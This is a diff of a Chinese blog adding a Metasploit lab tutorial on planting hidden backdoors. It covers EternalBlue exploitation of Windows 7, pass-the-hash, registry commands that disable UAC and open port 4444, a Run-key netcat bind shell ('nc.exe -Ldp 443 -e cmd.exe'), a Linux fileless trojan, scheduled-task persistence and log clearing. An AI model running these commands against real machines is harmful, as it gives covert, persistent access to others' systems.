@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">34</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">35</span></a>
 
   </li>
   </ul>
@@ -633,15 +633,6 @@
                 <span class="post-meta-item-text">更新于</span>
                 <time title="修改时间：2021-10-08 10:46:43" itemprop="dateModified" datetime="2021-10-08T10:46:43+08:00">2021-10-08</time>
               </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
-                </span>
-            </span>
 
           
 
@@ -805,6 +796,230 @@
 <p>![image-20210819205150600](Mestasploit渗透测试之制作隐藏back door/image-20210819205150600.png)</p>
 <p>还可以</p>
 <p>![image-20210819205205428](Mestasploit渗透测试之制作隐藏back door/image-20210819205205428.png)</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/" class="post-title-link" itemprop="url">Mestasploit渗透测试之制作隐藏back door</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-19 20:54:06" itemprop="dateCreated datePublished" datetime="2021-08-19T20:54:06+08:00">2021-08-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-10-08 10:58:37" itemprop="dateModified" datetime="2021-10-08T10:58:37+08:00">2021-10-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Mestasploit渗透测试之制作隐藏back-door"><a href="#Mestasploit渗透测试之制作隐藏back-door" class="headerlink" title="Mestasploit渗透测试之制作隐藏back door"></a>Mestasploit渗透测试之制作隐藏back door</h1><h2 id="一、隐藏back-door的意义"><a href="#一、隐藏back-door的意义" class="headerlink" title="一、隐藏back door的意义"></a>一、隐藏back door的意义</h2><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819101229168.png" alt="image-20210819101229168"></p>
+<h2 id="二、使用msf17-010永恒之蓝漏洞对win7进行渗透"><a href="#二、使用msf17-010永恒之蓝漏洞对win7进行渗透" class="headerlink" title="二、使用msf17-010永恒之蓝漏洞对win7进行渗透"></a>二、使用msf17-010永恒之蓝漏洞对win7进行渗透</h2><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819102221708.png" alt="image-20210819102221708"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819102252809.png" alt="image-20210819102252809"></p>
+<p><strong>win7环境</strong></p>
+<p>防火墙可以打开（使用家庭/工作网络）</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819102146715.png" alt="image-20210819102146715"></p>
+<p><strong>步骤1：</strong>渗透</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105253580.png" alt="image-20210819105253580"></p>
+<p>加载、配置、启动模块</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105337567.png" alt="image-20210819105337567"></p>
+<p>渗透成功</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105421575.png" alt="image-20210819105421575"></p>
+<p><strong>步骤2：</strong>创建一个新用户远程连接win7桌面</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105618584.png" alt="image-20210819105618584"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105650319.png" alt="image-20210819105650319"></p>
+<p>启动远程桌面</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105837404.png" alt="image-20210819105837404"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105910331.png" alt="image-20210819105910331"></p>
+<p>输入密码后，若对方正在登录则会提升如下图。（对方也会有对应的提升，如果对方30s/一段时间没操作就会默认允许）</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105942245.png" alt="image-20210819105942245"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110057886.png" alt="image-20210819110057886"></p>
+<p><strong>步骤3：</strong>关闭主机防护策略并开启back door</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110454539.png" alt="image-20210819110454539"></p>
+<p>这利用SAM，红色字段就是用哈斯算法加密的账号密码，前面是账号</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110728859.png" alt="image-20210819110728859"></p>
+<p>补充：kali（linux系统）进入window的shell后会有乱码，可以输入输入 chcp 65001</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110958691.png" alt="image-20210819110958691"></p>
+<p>指令：netsh firewall add portopening TCP 4444 “xuegod” ENABLE ALL</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111013939.png" alt="image-20210819111013939"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111056435.png" alt="image-20210819111056435"></p>
+<p>指令：cmd.exe/k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111130454.png" alt="image-20210819111130454"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111235180.png" alt="image-20210819111235180"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111252073.png" alt="image-20210819111252073"></p>
+<p>退出shell：Ctrl+c</p>
+<p>指令：cmd.exe/k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v  LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</p>
+<p><strong>步骤3：</strong>使用密码hash值登录系统</p>
+<p>说明：1.红色字段是步骤2用hashdump查看到xuegod的密码哈斯值</p>
+<p>2.SMBDomain值来自win7的工作组，如下图</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111937637.png" alt="image-20210819111937637"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111520715.png" alt="image-20210819111520715"></p>
+<p>补充：如果失败了，多尝试几次（即使配置都正确，也不会100%成功）</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112119208.png" alt="image-20210819112119208"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112142192.png" alt="image-20210819112142192"></p>
+<p>说明：C:\windows\system32只是存放路径，可以放得隐藏些，但要记住（后面还要用）</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112827492.png" alt="image-20210819112827492"></p>
+<p>指令：reg setval -k HKLM\software\microsoft\windows\currentversion\run -v lltest_nc -d ‘C:\windows\nc.exe -Ldp 443 -e cmd.exe’</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112348784.png" alt="image-20210819112348784"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112412948.png" alt="image-20210819112412948"></p>
+<p>也可以这样重启</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113147179.png" alt="image-20210819113147179"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113008314.png" alt="image-20210819113008314"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113051369.png" alt="image-20210819113051369"> </p>
+<p>登录后程序才会运行，防火墙会弹出提示</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113307966.png" alt="image-20210819113307966"></p>
+<p>程序已经在win7后台进行在监听</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113701382.png" alt="image-20210819113701382"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113549553.png" alt="image-20210819113549553"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113756461.png" alt="image-20210819113756461"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113805371.png" alt="image-20210819113805371"></p>
+<h2 id="三、Linux无文件木马程序"><a href="#三、Linux无文件木马程序" class="headerlink" title="三、Linux无文件木马程序"></a>三、Linux无文件木马程序</h2><p><strong>环境</strong></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819155530456.png" alt="image-20210819155530456"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160114518.png" alt="image-20210819160114518"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160212702.png" alt="image-20210819160212702"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160235373.png" alt="image-20210819160235373"></p>
+<p><strong>步骤1</strong>：监听</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160459633.png" alt="image-20210819160459633"></p>
+<p>渗透</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160606476.png" alt="image-20210819160606476"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160633596.png" alt="image-20210819160633596"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160805424.png" alt="image-20210819160805424"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160847284.png" alt="image-20210819160847284"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160858685.png" alt="image-20210819160858685"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160951858.png" alt="image-20210819160951858"></p>
+<p>渗透成功</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161050688.png" alt="image-20210819161050688"></p>
+<p><strong>步骤2：</strong>到centos操作系统下载执行文件来建立session</p>
+<p>（为了模拟实战隐藏行为效果，通过session进行操作）</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161335768.png" alt="image-20210819161335768"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161825848.png" alt="image-20210819161825848"></p>
+<p>补充：</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161537170.png" alt="image-20210819161537170"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161548062.png" alt="image-20210819161548062"></p>
+<p>直接输入程序地址来执行</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161706964.png" alt="image-20210819161706964"></p>
+<p>查看程序地址</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161734385.png" alt="image-20210819161734385"></p>
+<p><strong>步骤3</strong>：创建无文件back door程序</p>
+<p>配置监听4444端口（要新开个终端窗口）</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162015597.png" alt="image-20210819162015597"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162602534.png" alt="image-20210819162602534"></p>
+<p>（靶机终端效果展示）</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162708421.png" alt="image-20210819162708421"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162825798.png" alt="image-20210819162825798"></p>
+<p>说明：我们的木马文件必须放在vegile文件下</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163137866.png" alt="image-20210819163137866"></p>
+<p>（靶机终端效果展示）</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163209475.png" alt="image-20210819163209475"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163318186.png" alt="image-20210819163318186"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163454991.png" alt="image-20210819163454991"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163629607.png" alt="image-20210819163629607"></p>
+<p>效果</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163806587.png" alt="image-20210819163806587"></p>
+<p>补充：由于我们远程控制靶机下载了2个恶意文件，很容易暴露</p>
+<p>我们可以删除2个文件，其还可以监听到</p>
+<p>靶机端删除</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164122924.png" alt="image-20210819164122924"></p>
+<p>攻击者端</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164347771.png" alt="image-20210819164347771"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164453141.png" alt="image-20210819164453141"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164501638.png" alt="image-20210819164501638"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164529645.png" alt="image-20210819164529645"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819201847720.png" alt="image-20210819201847720"></p>
+<h2 id="四、使用脚本进行自动创建back-door"><a href="#四、使用脚本进行自动创建back-door" class="headerlink" title="四、使用脚本进行自动创建back door"></a>四、使用脚本进行自动创建back door</h2><p><strong>步骤1：</strong>配置脚本程序：</p>
+<p>​    注意要如图所视目录操作；因为后面的下载路径是根据这里来的。（当然也可以该，要是要注意下载路径）</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202050680.png" alt="image-20210819202050680"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202616448.png" alt="image-20210819202616448"></p>
+<p>步骤2：渗透</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202658813.png" alt="image-20210819202658813"></p>
+<p>（监听与上面实战例子的渗透模块一样，所以这里就不写操作了）</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202433617.png" alt="image-20210819202433617"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202832845.png" alt="image-20210819202832845"></p>
+<p>靶机执行脚本（这里只是为了展示，应该是有kali里执行比较好）</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203051765.png" alt="image-20210819203051765"></p>
+<p>kali查看监听结果</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203151702.png" alt="image-20210819203151702"></p>
+<p>进入会话后</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203304121.png" alt="image-20210819203304121"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203339202.png" alt="image-20210819203339202"></p>
+<p><strong>步骤3：</strong>让脚本自动运行</p>
+<p>方法1：配置开机自启动</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203504865.png" alt="image-20210819203504865"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203920988.png" alt="image-20210819203920988"></p>
+<p>方法2：配置系统级别的计划任务</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204117351.png" alt="image-20210819204117351"></p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204145273.png" alt="image-20210819204145273"></p>
+<p>效果说明：靶机系统让脚本每小时启动一次</p>
+<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204258879.png" alt="image-20210819204258879"></p>
+<h2 id="五、清理系统日志"><a href="#五、清理系统日志" class="headerlink" title="五、清理系统日志"></a>五、清理系统日志</h2><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204504875.png" alt="image-20210819204504875"></p>
